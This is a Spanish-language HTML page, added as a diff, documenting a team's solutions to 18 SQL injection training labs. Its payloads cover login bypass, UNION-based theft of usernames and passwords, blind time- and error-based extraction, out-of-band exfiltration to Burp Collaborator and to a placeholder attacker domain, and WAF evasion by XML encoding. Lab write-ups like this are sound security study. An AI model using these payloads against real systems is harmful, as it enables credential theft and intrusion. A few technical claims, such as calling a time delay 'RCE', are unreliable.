@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ROAD TO HALL OF FAME :: SQL INJECTION</title>
+  
+  <link rel="icon" type="image/png" href="../assets/favicon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=VT323&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg-void: #050508;
+      --zsnes-top: #5a6885;
+      --zsnes-bottom: #212536;
+      --metal-light: #8a9bb8;
+      --metal-dark: #12141d;
+      --text-main: #d1d5db;
+      --text-dim: #9ca3af;
+      --accent-cyan: #22d3ee;
+      --accent-green: #4ade80;
+      --accent-alert: #f87171;
+      --accent-gold: #fbbf24;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background-color: var(--bg-void);
+      color: var(--text-main);
+      font-family: 'VT323', monospace;
+      font-size: 20px;
+      line-height: 1.6;
+      padding-top: 60px;
+      overflow-x: hidden;
+    }
+
+    .crt-overlay {
+      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%);
+      background-size: 100% 4px; pointer-events: none; z-index: 9999;
+    }
+
+    /* ZSNES BAR (MODO RETORNO) */
+    .zsnes-bar {
+      position: fixed; top: 0; left: 0; width: 100%; height: 45px;
+      background: linear-gradient(180deg, var(--zsnes-top) 0%, var(--zsnes-bottom) 100%);
+      border-bottom: 2px solid var(--metal-dark);
+      display: flex; align-items: center; padding: 0 1rem; z-index: 1000;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+      font-family: 'Space Mono', monospace; font-size: 0.85rem;
+    }
+    .nav-link { color: #fff; text-decoration: none; font-weight: bold; letter-spacing: 1px; }
+    .nav-link:hover { color: var(--accent-cyan); }
+
+    /* HEADER */
+    .hero-section { text-align: center; padding: 3rem 1rem; border-bottom: 2px dashed #333; }
+    .hero-section h1 { font-size: 4rem; color: var(--accent-gold); margin-bottom: 0.5rem; text-shadow: 4px 4px 0 #000; }
+    .hero-section p { font-family: 'Space Mono'; font-size: 1rem; color: var(--accent-cyan); }
+    
+    .btn-download {
+      display: inline-block; margin-top: 2rem; padding: 12px 24px;
+      background: var(--accent-gold); color: #000; font-family: 'Space Mono';
+      font-weight: bold; text-decoration: none; border: 2px solid #fff;
+      transition: all 0.3s ease; box-shadow: 4px 4px 0 rgba(255,255,255,0.2);
+    }
+    .btn-download:hover { background: #fff; color: #000; transform: translate(-2px, -2px); box-shadow: 6px 6px 0 rgba(255,255,255,0.4); }
+
+    /* ROADMAP CONTAINER */
+    .roadmap-container {
+      max-width: 950px; margin: 4rem auto; padding: 0 1rem;
+      border-left: 4px solid var(--accent-cyan); position: relative;
+    }
+
+    /* ROADMAP NODE (LAB CARD) */
+    .roadmap-node {
+      background: #0d0d14; border: 1px solid #333; margin-bottom: 3.5rem; margin-left: 2.5rem;
+      padding: 2rem; position: relative; box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+    }
+    .roadmap-node::before {
+      content: ''; position: absolute; left: -3.4rem; top: 1.5rem; width: 18px; height: 18px;
+      background: var(--accent-green); border: 3px solid #000; border-radius: 50%;
+      box-shadow: 0 0 10px var(--accent-green);
+    }
+
+    .lab-title { font-size: 2rem; color: #fff; border-bottom: 1px solid #222; padding-bottom: 0.5rem; margin-bottom: 1.5rem; text-transform: uppercase; }
+    .lab-badge { font-family: 'Space Mono'; font-size: 0.85rem; background: rgba(34, 211, 238, 0.1); color: var(--accent-cyan); padding: 4px 10px; border: 1px solid var(--accent-cyan); margin-right: 15px; vertical-align: middle; }
+    
+    .lab-content { display: flex; flex-direction: column; gap: 1.5rem; }
+    .lab-img { width: 100%; border: 2px solid #333; border-radius: 4px; box-shadow: 0 4px 8px rgba(0,0,0,0.6); }
+    
+    .tech-desc { font-family: 'Space Mono'; font-size: 0.95rem; color: var(--text-dim); text-align: justify; line-height: 1.7; }
+    .evidence-box { background: #000; border-left: 4px solid var(--accent-green); padding: 1.5rem; font-family: 'Space Mono'; font-size: 0.9rem; color: #d1d5db; line-height: 1.6; }
+    .payload { color: var(--accent-alert); font-weight: bold; background: #111; padding: 2px 6px; border-radius: 3px; border: 1px solid #333; }
+    
+    .no-img-badge { background: rgba(248, 113, 113, 0.1); color: var(--accent-alert); padding: 10px; text-align: center; border: 1px dashed var(--accent-alert); font-family: 'Space Mono'; font-size: 0.85rem; margin-bottom: 1rem; }
+
+  </style>
+</head>
+<body>
+
+<div class="crt-overlay"></div>
+
+<nav class="zsnes-bar">
+    <a href="../index.html" class="nav-link"><< RETURN TO INDEX</a>
+    <span style="margin-left:auto; color:#aaa;">DIR: /HALL_OF_FAME/SQL_INJECTION</span>
+</nav>
+
+<header class="hero-section">
+  <h1>ROAD TO HALL OF FAME</h1>
+  <p>[ PATH: SQL INJECTION MASTERY - 18 LABS ]</p>
+  <a href="../assets/act08-Equipo3.pdf" target="_blank" class="btn-download">⬇ DESCARGAR DOCUMENTO TÉCNICO COMPLETO (PDF)</a>
+</header>
+
+<main class="roadmap-container">
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 01</span> Hidden Data Retrieval</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab01.png" alt="Evidencia Lab 01" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> En este escenario, la aplicación web recibe el parámetro de categoría desde la URL y lo concatena directamente en una consulta SQL del tipo <code>SELECT * FROM products WHERE category = '...' AND released = 1</code>. La vulnerabilidad reside en la falta de validación de este parámetro, lo que permite manipular la lógica booleana de la sentencia WHERE para revelar artículos no publicados o inactivos.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> Interceptamos la petición HTTP utilizando Burp Suite y modificamos el parámetro <code>category</code> inyectando el payload <span class="payload">' OR 1=1--</span>. Al hacer esto, la consulta en el backend se transforma en <code>SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1</code>. La secuencia <code>--</code> comenta el resto de la línea original, haciendo que la cláusula <code>OR 1=1</code> evalúe como verdadera para cada registro en la tabla, forzando a la base de datos a volcar el catálogo completo, independientemente del estado de liberación del producto.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 02</span> Login Bypass</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab02.png" alt="Evidencia Lab 02" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> La vulnerabilidad se presenta en el formulario de inicio de sesión, donde las credenciales proporcionadas por el usuario se insertan sin sanitizar en la consulta de autenticación. Esto permite truncar la validación lógica de la contraseña y autenticarse como cualquier usuario existente en el sistema, comprometiendo por completo el mecanismo de control de acceso.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> En el campo de nombre de usuario, ingresamos <span class="payload">administrator'--</span>. El sistema interpreta la consulta como <code>SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'</code>. La comilla simple cierra la cadena del nombre de usuario de manera prematura, mientras que los guiones anulan la verificación de la contraseña, retornando un resultado válido ("True") y concediendo acceso directo a la cuenta de administrador.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 03</span> Determine Columns (UNION)</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab03.png" alt="Evidencia Lab 03" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> Antes de poder extraer información útil de otras tablas mediante el operador UNION, es imperativo que nuestra consulta inyectada devuelva exactamente el mismo número de columnas que la consulta original. Este laboratorio se centra en la fase de descubrimiento (Fingerprinting estructural) de la consulta subyacente.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> Realizamos peticiones iterativas añadiendo valores nulos a la cláusula UNION: <span class="payload">' UNION SELECT NULL--</span>, luego <span class="payload">' UNION SELECT NULL, NULL--</span>, y finalmente <span class="payload">' UNION SELECT NULL, NULL, NULL--</span>. Dado que la base de datos devuelve un Internal Server Error (500) cuando las columnas no coinciden, observamos que en el tercer intento la página se renderizó correctamente (200 OK), determinando con precisión que el backend requiere tres columnas.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 04</span> Find Text Column (UNION)</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab04.png" alt="Evidencia Lab 04" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> Una vez determinada la cantidad de columnas (3), el siguiente paso indispensable en un ataque UNION es identificar cuáles de estas columnas poseen tipos de datos compatibles con texto (VARCHAR/String). Las reglas estrictas de SQL dictan que el tipo de dato de cada columna inyectada debe coincidir con el de la consulta original.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> Procedimos a sustituir iterativamente cada valor <code>NULL</code> por el carácter alfanumérico <span class="payload">'a'</span>. Al probar <span class="payload">' UNION SELECT NULL, 'a', NULL--</span>, el frontend no generó errores de conversión de tipos y reflejó el string 'a' dentro de la tabla de listado de productos, confirmando que la segunda columna es el vector viable para exfiltrar datos en texto plano.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 05</span> Retrieve Data from Other Tables</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab05.png" alt="Evidencia Lab 05" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> Habiendo mapeado la estructura completa (cantidad de columnas y aquellas que soportan texto), ejecutamos la exfiltración real. El objetivo es apuntar al esquema <code>users</code> para extraer identificadores y hashes, fusionando los resultados de nuestra consulta maliciosa con la respuesta legítima de la aplicación web.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> Se construyó e inyectó el payload final: <span class="payload">' UNION SELECT username, password FROM users--</span>. Dado que sabíamos que la consulta original devolvía dos columnas de texto compatibles en la respuesta visual, la base de datos acató la orden, iteró sobre la tabla 'users' y plasmó las credenciales administrativas de la base de datos directamente en el catálogo de artículos del frontend.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 06</span> Multiple Values in Single Column</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab06.png" alt="Evidencia Lab 06" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> En ocasiones, las defensas o la estructura de la aplicación limitan la visualización de resultados a una sola columna de texto, a pesar de que el operador UNION exige coincidir en múltiples columnas. La técnica para superar este bloqueo es la concatenación de cadenas, permitiendo extraer múltiples campos de la base de datos empaquetados en un solo string.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> Se determinó que la consulta requería dos columnas, pero solo una era visible. Usando el operador de concatenación estándar, inyectamos <span class="payload">' UNION SELECT username || '~' || password, NULL FROM users--</span>. Esto instruyó al motor SQL a unir el nombre de usuario y la contraseña separados por una tilde, extrayendo ambos valores críticos y eludiendo la restricción visual.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 07</span> Querying DB Version (Oracle)</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab07.png" alt="Evidencia Lab 07" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> El reconocimiento de base de datos (Database Fingerprinting) es crucial para adaptar los comandos sintácticos en ataques complejos. Los motores de bases de datos tienen comportamientos únicos; por ejemplo, Oracle requiere estrictamente que cada sentencia <code>SELECT</code> provenga de una tabla (cláusula FROM), utilizando la tabla virtual <code>dual</code> o vistas dinámicas como <code>v$version</code>.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> Para extraer el banner de la versión y confirmar que nos enfrentábamos a un entorno Oracle, inyectamos <span class="payload">' UNION SELECT banner, NULL FROM v$version--</span>. Al referenciar esta vista de rendimiento dinámica específica de Oracle, el sistema web nos devolvió en texto claro la versión exacta (ej. Oracle Database 11g Express Edition).
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 08</span> Querying DB Version (MySQL/Microsoft)</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab08.png" alt="Evidencia Lab 08" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> A diferencia de Oracle, entornos como MySQL y Microsoft SQL Server permiten ejecutar consultas <code>SELECT</code> sin necesidad de invocar una tabla (omitiendo la cláusula FROM). Esto simplifica el Fingerprinting y nos permite consultar directamente las variables globales del servidor que contienen metadatos sensibles.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> Mediante el uso del payload <span class="payload">' UNION SELECT @@version, NULL#</span> (donde el símbolo de hash # se utiliza comúnmente para comentar en MySQL), le pedimos al servidor que imprimiera el valor de la variable de sistema <code>@@version</code>. El frontend renderizó la cadena de versión, revelando la arquitectura y el parche actual del motor MySQL/MSSQL subyacente.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 09</span> List DB Contents (Non-Oracle)</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab09.png" alt="Evidencia Lab 09" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> La enumeración de esquemas (descubrimiento de tablas y columnas) es el proceso forense que precede a la exfiltración en aplicaciones de caja negra. En motores compatibles con el estándar ANSI SQL (como PostgreSQL, MySQL o MSSQL), este diccionario de datos estandarizado se aloja en la base de datos <code>information_schema</code>.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> Ejecutamos un escaneo del esquema en dos fases. Primero: <span class="payload">' UNION SELECT table_name, NULL FROM information_schema.tables--</span>, lo que nos listó todas las tablas, identificando una llamada <code>users_abcdef</code>. Posteriormente, enumeramos sus columnas: <span class="payload">' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--</span>, revelando los nombres ofuscados de los campos de contraseña, preparándonos para la extracción final.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 10</span> List DB Contents (Oracle)</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab10.png" alt="Evidencia Lab 10" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> En arquitecturas de Oracle, el estándar <code>information_schema</code> no está implementado. Por lo tanto, el descubrimiento de estructuras (esquemas, tablas y campos) requiere la consulta directa a las vistas de catálogo de diccionarios de datos privativas de Oracle, tales como <code>all_tables</code> y <code>all_tab_columns</code>.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> Sustituimos las consultas estandarizadas por comandos nativos de Oracle. Inyectamos <span class="payload">' UNION SELECT table_name, NULL FROM all_tables--</span> para obtener los nombres de tabla. Tras encontrar la tabla objetivo, mapeamos su estructura con <span class="payload">' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_XYZ'--</span>, finalizando la exfiltración con el conocimiento preciso de los identificadores.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 11</span> Blind SQLi (Conditional Responses)</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab11.png" alt="Evidencia Lab 11" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> Las inyecciones SQL ciegas (Blind SQLi) ocurren cuando la vulnerabilidad existe en el backend, pero los resultados de las consultas no se reflejan en la respuesta HTTP. El método de "Respuestas Condicionales" explota diferencias sutiles en el comportamiento de la aplicación (como el mensaje de bienvenida) cuando se le somete a aserciones lógicas (Verdadero vs Falso).</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> La cookie de tracking resultó vulnerable. Inyectamos una aserción booleana: <span class="payload">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</span>. Observamos que si el carácter coincidía, la página respondía con "Welcome back". Se automatizó este proceso en Burp Suite Intruder (Ataque Sniper iterativo) para fuerza-brutear el hash carácter por carácter, resolviendo la contraseña completa sin verla directamente.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 12</span> Blind SQLi (Conditional Errors)</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab12.png" alt="Evidencia Lab 12" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> Cuando el frontend de la aplicación web no presenta variaciones de contenido frente a consultas booleanas (imposibilitando la técnica anterior), el ataque se eleva forzando un error de procesamiento a nivel de base de datos de manera condicional. Si la sentencia es correcta, obligamos a la base de datos a ejecutar una operación ilegal (como una división por cero), disparando un error 500 que el atacante utiliza como indicador positivo.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> En un entorno Oracle, elaboramos un payload usando estructuras CASE: <span class="payload">'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</span>. Si la letra adivinada era incorrecta, la consulta no hacía nada y la página cargaba con código 200. Si la letra era correcta, el <code>THEN 1/0</code> crasheaba la consulta devolviendo un Internal Server Error. Esto permitió iterar sobre el abecedario.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 13</span> Visible Error-Based SQLi</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab13.png" alt="Evidencia Lab 13" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> Las inyecciones basadas en errores visibles explotan las malas configuraciones en la gestión de errores del servidor. Si un servidor web está configurado en "Modo de Depuración", vomitará las trazas (Stack Traces) de la base de datos hacia el cliente. El atacante manipula los tipos de datos en la consulta forzando a la base a intentar una conversión imposible que exponga el valor del dato sensible dentro de la descripción del error.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> Sabiendo que la cookie evaluaba enteros, inyectamos la consulta <span class="payload">' AND CAST((SELECT password FROM users WHERE username='administrator') AS int)=1--</span>. La subconsulta resolvió exitosamente la contraseña en texto, y posteriormente el motor SQL intentó convertirla en número (int). Al fallar catastróficamente, la página devolvió: "<i>Error converting varchar value 'hash_secreto_123' to data type int</i>", revelando el secreto.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 14</span> Blind SQLi (Time Delays)</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab14.png" alt="Evidencia Lab 14" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> Las inyecciones ciegas basadas en tiempo son el último recurso cuando la aplicación no devuelve diferencias visuales, ni responde a errores de sintaxis (Totalmente ciega y sincrónica). La técnica consiste en inyectar comandos de pausa o retardo en el motor de base de datos. Si la respuesta HTTP tarda el tiempo especificado en procesarse, se confirma la ejecución asíncrona del código malicioso.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> Analizando el comportamiento de una cookie de tracking en un motor PostgreSQL, inyectamos el comando de pausa nativo <span class="payload">|| pg_sleep(10)--</span>. Monitoreando los milisegundos de respuesta en Burp Suite, corroboramos que la petición que normalmente tomaba 50ms se estancó exactamente durante 10,000ms antes de regresar el estado 200 OK. La vulnerabilidad de RCE temporal fue confirmada.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 15</span> Blind SQLi (Time Delays & Info Retrieval)</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab15.png" alt="Evidencia Lab 15" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> La culminación lógica de los ataques ciegos. Este laboratorio combina la extracción de información carácter por carácter (vista en el Lab 11) con las demoras temporales (Lab 14). Se genera una sentencia condicional donde la pausa de ejecución se acciona única y exclusivamente si la adivinación del carácter de la contraseña es verdadera, midiendo el *timeout* como prueba afirmativa.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> Automatizamos el ataque mediante el payload: <span class="payload">%3BSELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--</span>. Si la petición se resolvía inmediatamente, pasábamos a la letra 'b'. Si la petición se quedaba colgada durante 10 segundos, anotábamos la letra 'a' como el primer carácter de la contraseña, avanzando a la siguiente posición.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node">
+    <h2 class="lab-title"><span class="lab-badge">LAB 16</span> Blind SQLi (Out-of-Band Interaction)</h2>
+    <div class="lab-content">
+      <img src="../assets/img/lab16.png" alt="Evidencia Lab 16" class="lab-img">
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> Ocasionalmente, las inyecciones ciegas basadas en tiempo o errores fallan debido a arquitecturas asíncronas profundas (donde la base de datos corre peticiones en *background threads* que no afectan la respuesta HTTP de la web). Para estas redes complejas, se emplean técnicas Out-of-Band (OAST). Consiste en forzar a la base de datos a iniciar una petición de red externa (usualmente una resolución DNS o un ping HTTP) hacia un servidor bajo control del atacante.</p>
+      <div class="evidence-box">
+        <strong>Evidencia y Explicación:</strong> A través de una inyección en Oracle, enviamos un payload estructurado en XML diseñado para generar un External Entity Injection (XXE) a nivel de base de datos: <span class="payload">UNION SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://burpcollaborator.net/"&gt; %remote;]&gt;'),'/l') FROM dual</span>. La máquina de la base de datos intentó resolver la entidad externa y el ping quedó registrado silenciosamente en los logs de nuestro panel de Burp Collaborator.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node" style="border-color: var(--accent-alert);">
+    <h2 class="lab-title"><span class="lab-badge" style="border-color: var(--accent-alert); color: var(--accent-alert);">LAB 17</span> Blind SQLi (Out-of-Band Data Exfiltration)</h2>
+    <div class="lab-content">
+      <div class="no-img-badge">[ EVIDENCIA GRÁFICA OMITIDA: REQUIERE LICENCIA BURP SUITE PROFESSIONAL ]</div>
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> Una vez validada la interacción de red Out-of-Band (Lab 16), el objetivo evoluciona de simplemente generar un "ping", a exfiltrar datos críticos de forma masiva y expedita en un entorno ciego. La técnica radica en concatenar la información extraída (como una subconsulta SQL que roba la contraseña) directamente dentro de la estructura de la URL del dominio atacante, transmitiendo los datos a través del protocolo DNS (Domain Name System).</p>
+      <div class="evidence-box">
+        <strong>Evidencia Documentada:</strong> Al carecer de la herramienta Burp Collaborator (inclusiva en licencias Pro), el procedimiento teórico dictamina el uso del payload: <span class="payload">http://'||(SELECT password FROM users WHERE username='administrator')||'.subdominio-atacante.com</span>. La base de datos evaluaría la consulta interior extrayendo el hash, y al intentar resolver el dominio completo (ej. <code>hash12345.subdominio-atacante.com</code>), el servidor DNS del atacante registraría el subdominio, logrando la fuga de información sin necesidad de comunicación directa con el frontend HTTP.
+      </div>
+    </div>
+  </article>
+
+  <article class="roadmap-node" style="border-color: var(--accent-alert);">
+    <h2 class="lab-title"><span class="lab-badge" style="border-color: var(--accent-alert); color: var(--accent-alert);">LAB 18</span> SQLi with Filter Bypass via XML Encoding</h2>
+    <div class="lab-content">
+      <div class="no-img-badge">[ EVIDENCIA GRÁFICA OMITIDA: REQUIERE EXTENSIONES BURP SUITE PROFESSIONAL ]</div>
+      <p class="tech-desc"><strong>Descripción Técnica:</strong> En infraestructuras corporativas y empresariales, los puntos de entrada son monitoreados rigurosamente por Web Application Firewalls (WAF). Estos dispositivos analizan las peticiones y bloquean palabras clave como `SELECT`, `UNION` o `DROP`. Para evadir estas defensas, los atacantes aplican técnicas de ofuscación de payloads (Encoding) adaptadas a la forma en que el backend procesa los datos (por ejemplo, decodificación de entidades XML antes de ser arrojadas al motor SQL).</p>
+      <div class="evidence-box">
+        <strong>Evidencia Documentada:</strong> El vector de ataque se enfocó en la funcionalidad de verificación de stock que transmite datos nativos en formato XML. Un payload tradicional <code>1 UNION SELECT username...</code> sería abortado por el WAF en la capa perimetral. Utilizando la extensión Hackvertor (o manipuladores hexadecimales), el payload fue ofuscado empleando XML Hex Entities (ej. la letra S se convierte en <span class="payload">&amp;#x53;</span>). El WAF inspecciona el string hexadecimal y lo deja pasar, asumiendo que es benigno. Al llegar al parser de backend, el código se decodifica de vuelta a la instrucción SQL maliciosa, eludiendo la defensa y concretando la inyección.
+      </div>
+    </div>
+  </article>
+
+</main>
+
+</body>
+</html>
